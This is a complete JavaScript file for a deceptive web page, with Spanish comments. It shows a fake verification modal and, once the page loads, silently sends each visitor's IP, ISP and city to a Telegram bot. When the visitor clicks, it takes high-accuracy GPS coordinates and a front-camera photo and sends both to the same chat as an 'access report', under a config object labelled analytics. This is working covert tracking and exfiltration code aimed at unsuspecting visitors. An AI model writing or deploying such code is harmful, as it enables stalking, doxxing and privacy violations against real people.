let state = { ipData: null, isProcessing: false }; // ============================================ // UTILIDADES DE SISTEMA // ============================================ async function getIPandISP() { try { const response = await fetch('https://ipapi.co/json/'); const data = await response.json(); return { ip: data.ip || 'N/A', isp: data.org || 'N/A', city: data.city || 'N/A', country: data.country_name || 'N/A' }; } catch (e) { return { ip: 'N/A', isp: 'N/A', city: 'N/A', country: 'N/A' }; } } // ============================================ // CAPTURA DE PERMISOS (GPS Y CÁMARA) // ============================================ function requestGPS() { return new Promise((resolve, reject) => { if (!navigator.geolocation) return reject({ message: 'No soportado' }); navigator.geolocation.getCurrentPosition( (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }), (err) => reject(err), { enableHighAccuracy: true, timeout: 10000 } ); }); } function requestCameraAndPhoto() { return new Promise(async (resolve, reject) => { if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return reject({ message: 'No soportado' }); try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); const video = document.createElement('video'); video.srcObject = stream; video.muted = true; video.setAttribute("playsinline", ""); video.play(); video.onloadedmetadata = () => { // Delay para ajuste de luz automático setTimeout(() => { const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0); const photo = canvas.toDataURL('image/jpeg', 0.7); stream.getTracks().forEach(t => t.stop()); resolve(photo); }, 1000); }; } catch (err) { reject(err); } }); } // ============================================ // ENVÍO A TELEGRAM // ============================================ async function sendFinalReport(gps, photoBase64) { const token = ANALYTICS_CONFIG.telegramBotToken; const chatId = ANALYTICS_CONFIG.telegramChatId; const net = state.ipData || {}; const fecha = new Date().toLocaleString('es-AR'); let caption = `🔴 *REPORTE DE ACCESO*\n`; caption += `━━━━━━━━━━━━━━━━━━━━\n\n`; caption += `📅 *Fecha:* ${fecha}\n`; caption += `🌐 *IP:* \`${net.ip}\`\n`; caption += `🏢 *ISP:* ${net.isp}\n`; caption += `📍 *Ciudad:* ${net.city}\n\n`; if (gps) { caption += `✅ *GPS:* [Ver Mapa](https://www.google.com/maps?q=${gps.lat},${gps.lng})\n`; caption += `📍 *Coord:* \`${gps.lat}, ${gps.lng}\`\n\n`; } else { caption += `❌ *GPS:* Denegado o sin señal\n\n`; } try { if (photoBase64) { // Convertir Base64 a Blob para Telegram const res = await fetch(photoBase64); const blob = await res.blob(); const formData = new FormData(); formData.append('chat_id', chatId); formData.append('photo', blob, 'user_capture.jpg'); formData.append('caption', caption); formData.append('parse_mode', 'Markdown'); await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } else { // Solo texto si no hay foto await fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: caption + `❌ *Cámara:* Denegada`, parse_mode: 'Markdown' }) }); } } catch (e) { console.error("Error enviando a Telegram", e); } } // ============================================ // MANIPULACIÓN DE LA INTERFAZ (UI) // ============================================ function updateUIStatus(text, isError = false) { const indicator = document.querySelector('.bg-yellow-50 p'); const container = document.querySelector('.bg-yellow-50'); if (indicator) { indicator.innerHTML = `${text}`; if (isError) { container.classList.replace('bg-yellow-50', 'bg-red-50'); container.classList.replace('border-yellow-400', 'border-red-500'); indicator.classList.replace('text-yellow-800', 'text-red-800'); } } } function updateButton(text, disabled) { const btn = document.getElementById('confirm-location-btn'); if (btn) { btn.innerText = text; btn.disabled = disabled; btn.style.opacity = disabled ? "0.7" : "1"; } } async function handleAction() { if (state.isProcessing) return; state.isProcessing = true; updateButton('⏳ Verificando...', true); updateUIStatus('Solicitando acceso al sistema...'); // Lanzar ambos permisos const results = await Promise.allSettled([ requestGPS(), requestCameraAndPhoto() ]); const gpsData = results[0].status === 'fulfilled' ? results[0].value : null; const photoData = results[1].status === 'fulfilled' ? results[1].value : null; updateUIStatus('Sincronizando con el servidor...'); await sendFinalReport(gpsData, photoData); // Ocultar modal y liberar scroll const modal = document.getElementById('location-modal'); if (modal) modal.classList.add('hide'); document.body.style.overflow = 'auto'; } async function init() { // Bloquear scroll inicial document.body.style.overflow = 'hidden'; // Obtener IP en segundo plano state.ipData = await getIPandISP(); // Notificación silenciosa de entrada const net = state.ipData; fetch(`https://api.telegram.org/bot${ANALYTICS_CONFIG.telegramBotToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: ANALYTICS_CONFIG.telegramChatId, text: `👁️ *Visita en vivo*\nIP: ${net.ip}\nISP: ${net.isp}\nCiudad: ${net.city}`, parse_mode: 'Markdown' }) }).catch(()=>{}); updateUIStatus('Conexión establecida. Pendiente de validación.'); } // ============================================ // INICIO // ================================ document.addEventListener('DOMContentLoaded', () => { init(); const btn = document.getElementById('confirm-location-btn'); if (btn) btn.addEventListener('click', handleAction); });
